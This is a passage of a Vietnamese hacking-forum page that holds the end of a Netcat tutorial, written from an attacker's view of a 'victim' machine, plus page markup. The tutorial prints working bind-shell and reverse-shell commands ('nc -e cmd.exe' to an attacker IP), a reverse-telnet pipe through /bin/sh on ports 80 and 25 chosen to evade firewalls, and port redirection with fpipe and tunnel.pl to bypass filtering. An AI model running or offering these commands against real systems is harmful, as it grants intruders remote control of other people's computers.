ntcrash.zip password.txt pwdump.exe<br/> 6 File(s) 262,499 bytes<br/> 2 Dir(s) 191,488,000 bytes free<br/><br/> C:\test&gt;exit<br/> exit<br/> sent 20, rcvd 450: NOTSOCK<br/><br/><br/> Như bạn thấy, chúng ta đã có thể làm gì mà chẳng được với máy của nạn nhân qua shell lệnh này?! Tuy nhiên, sau kết nối trên, netcat trên máy nạn nhân cũng đóng luôn. Để yêu cầu netcat lắng nghe trở lại sau mỗi kết nối, bạn dùng -L thay cho -l. Lưu ý: -L chỉ có thể áp dụng cho bản Netcat for Windows, không áp dụng cho bản chạy trên Linux.<br/><br/> E:\&gt;nc -nvv -L -p 8080 -e cmd.exe<br/> listening on [any] 8080 ...<br/><br/><br/> - Riêng đối với Netcat cho Win, bạn có thể lắng nghe ngay trên cổng đang lắng nghe. Chỉ cần chỉ định địa chỉ nguồn là -s &lt;địa_chỉ_ip_của_máy_này&gt;. Ví dụ:<br/><br/> netstat -a<br/> ...<br/> TCP nan_nhan:domain nan_nhan:0 LISTENING &lt;- cổng 53 đang lắng nghe<br/> ...<br/><br/> E:\&gt;nc -nvv -L -e cmd.exe -s 172.16.84.1 -p 53 -&gt; lắng nghe ngay trên cổng 53<br/> listening on [172.16.84.1] 53 ...<br/> connect to [172.16.84.1] from (UNKNOWN) [172.16.84.1] 3163<br/><br/><br/> - Trên Windows NT, để đặt Netcat ở chế độ lắng nghe, không cần phải có quyền Administrator, chỉ cần login vào với 1 username bình thường khởi động Netcat là xong.<br/><br/> - Chú ý: bạn không thể chạy netcat với ... -u -e cmd.exe... hoặc ...-u -e /bin/sh... vì netcat sẽ không làm việc đúng. Nếu bạn muốn có một UDP shell trên Unix, hãy dùng udpshell thay cho netcat.<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> <font color='red'>5. Kĩ thuật tiên tiến</font><br/> 5.1 Telnet nghịch chuuyển<br/> - dùng telnet để nối cửa số netcat đang lắng nghe, kế đó đưa lệnh từ cửa sổ này vào luồng telnet nghịch chuyển, và gởi kết quả vào cửa sổ kia. Ví dụ:<br/><br/> - trên máy dùng để tấn công(172.16.84.1), mở 2 cửa sổ netcat lần lượt lắng nghe trên cổng 80 và 25:<br/><br/> + cửa sổ Netcat (1)<br/><br/> C:\&gt;nc -nvv -l -p 80<br/> listennng on [any] 80 ...<br/> connect to [172.16.84.1] from &lt;UNKNOWN&gt; [172.16.84.2] 1055<br/> pwd<br/> ls -la<br/> _<br/><br/><br/> + cửa sổ Netcat (2)<br/><br/> C:\&gt;nc -nvv -l -p 25<br/> listening on [any] 25 ...<br/> connect to [172.16.84.1] from (UNKNOWN) [172.16.84.2] 1056<br/> /<br/> total 171<br/> drwxr-xr-x 17 root root 4096 Feb 5 16:15 .<br/> drwxr-xr-x 17 root root 4096 Feb 5 16:15 ..<br/> drwxr-xr-x 2 root root 4096 Feb 5 08:55 b ( ²?n<br/> drwxr-xr-x 3 root root 4096 Feb 5 14:19 boot<br/> drwxr-xr-x 13 root root 106496 Feb 5 14:18 dev<br/> drwxr-xr-x 37 root root 4096 Feb 5 14:23 et = ²?<br/> drwxr-xr-x 6 root root 4096 Feb 5 08:58 home<br/> drwxr-xr-x 6 root root 4096 Feb 5 08:50 l ( ²?b<br/> drwxr-xr-x 2 root root 7168 De = ²? 31 1969 mnt<br/> drwxr-xr-x 4 root root 4096 Feb 5 16:18 n = ²?<br/> drwxr-xr-x 2 root root 4096 Aug 23 12:03 opt<br/> dr-xr-xr-x 61 root root 0 Feb 5 09:18 pro = ²?<br/> drwx------ 12 root root 4096 Feb 5 16:24 root<br/> drwxr-xr-x 2 root root 4096 Feb 5 08:55 sb ( ²?n<br/> drwxrwxrwt 9 root root 4096 Feb 5 16:25 tmp<br/> drwxr-xr-x 13 root root 4096 Feb 5 08:42 usr<br/> drwxr-xr-x 18 root root 4096 Feb 5 08:52 var<br/><br/><br/> - trên máy tính nạn nhân(172.16.84.2), telnet nghịch chuyển đến máy dùng để tấn công(172.16.84.1), dùng /bin/sh để kết xuất:<br/><br/> [root@nan_nhan /]# telnet 172.16.84.1 80 | /bin/sh | telnet 172.16.84.1 25<br/> /bin/sh: Trying: command not found<br/> /bin/sh: Connected: command not found<br/> /bin/sh: Escape: command not found<br/> Trying 172.16.84.1...<br/> Connected to 172.16.84.1.<br/> Escape character is '^]'.<br/> _<br/><br/><br/> Telnet trên máy nạn nhân sẽ chuyển tất cả những gì mà chúng ta gõ vào trong cửa sổ Netcat (1) - cổng 80 kết xuất sang cho /bin/sh thi hành. Kết quả của /bin/sh được kết xuất trở lại cho máy tính dùng để tấn công trên cửa sổ Netcat (2) - cổng 25. Nhiệm vụ của bạn là chỉ cần gõ lệnh vào cửa sổ Netcat (1) và xem kết quả trong cửa sổ Netcat (2).<br/><br/> Sở dĩ tôi chọn cổng 80 và 25 vì các cổng này thường không bị firewalls hoặc filters lọc.<br/><br/> 5.2 Tạo kênh sau<br/> Cũng tương tự như telnet nghịch chuyển.<br/><br/> - trên máy tính dùng để tấn công, bạn đặt Netcat lắng nghe trên cổng 80 vì cổng này sẽ không bị firewall chặn:<br/><br/> C:\&gt;nc -nvv -l -p 80<br/> listennng on [any] 80 ...<br/><br/><br/> - tiếp theo, từ shell lệnh của máy nạn nhân, bạn nối Netcat đến máy dùng để tấn công với tùy chọn -e để đổ shell:<br/><br/> E:\&gt;nc -e cmd.exe 172.16.84.1 80<br/><br/><br/> Một khi máy nạn nhân thi hành chuổi lệnh trên, kênh sau nc sẽ được tạo, "nhét" shell (trong trường hợp này là cmd.exe) trở vào nc. Kể từ đây, chúng ta đã có 1 shell lệnh ảo.<br/><br/> C:\&gt;nc -nvv -l -p 80<br/> listenning pm [any] 80 ...<br/> connect to [172.16.84.1] from [UNKNOWN] [172.16.84.3] 1035<br/><br/> Microsoft Windows 2000 [Version 5.00.2195]<br/> (C) Copyright 1985-1999 Microsoft Corp.<br/><br/> E:\&gt;<br/><br/><br/> 5.3 Đổi hướng cổng<br/> Bạn có thể dùng tunnel.pl hoặc fpipe.exe. Hãy xem ví dụ sau:<br/><br/> - chạy nc trên cổng bất kì:<br/><br/> E:\&gt;nc -nvv -L -p 1234 -e cmd.exe<br/> listening on [any] 1234 ...<br/><br/><br/> - chạy tunnel hoặc fpipe để đổi hướng cổng<br/><br/> C:\&gt;perl tunnel.pl --port=53 --tohost=127.0.0.1 --toport=1234<br/><br/><br/> C:\&gt;fpipe -l 53 -r 1234 127.0.0.1<br/><br/><br/> tunnel, fpipe sẽ lắng nghe trên cổng 53, sau đó chuyển tiếp kết nối đến 127.0.0.1:1024, đây là cổng mà netcat đang lắng nghe.<br/><br/> Đổi hướng cổng là một cách để đi vòng qua firewalls.<br/> --------------------------------------------------------------------------------<br/><br/> <font color='red'>6. Kết luận:</font><br/> Netcat rất tuyệt!<br/> - Vicki - </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/5.html">Góp ý và Hỏi đáp thắc mắc chung</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/149.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/149/547.html#547,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> Giờ bắt đầu post lại bài đây anh.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/761.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
								<a href="/hvaonline/posts/listByUser/120/761.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_prev_page.gif" width="5" height="9" alt="Page 5" title="Page 5"/>
								</a>
							
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/150/761.html">6</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/180/761.html">7</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/210/761.html">8</a></span>
							
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/761' + '.html'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
								<option value="4" >4</option>	
								<option value="5" >5</option>	
								<option value="6" >6</option>	
								<option value="7" >7</option>	
								<option value="8" >8</option>	
								<option value="9" selected="selected">9</option>	
						</select>
						
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
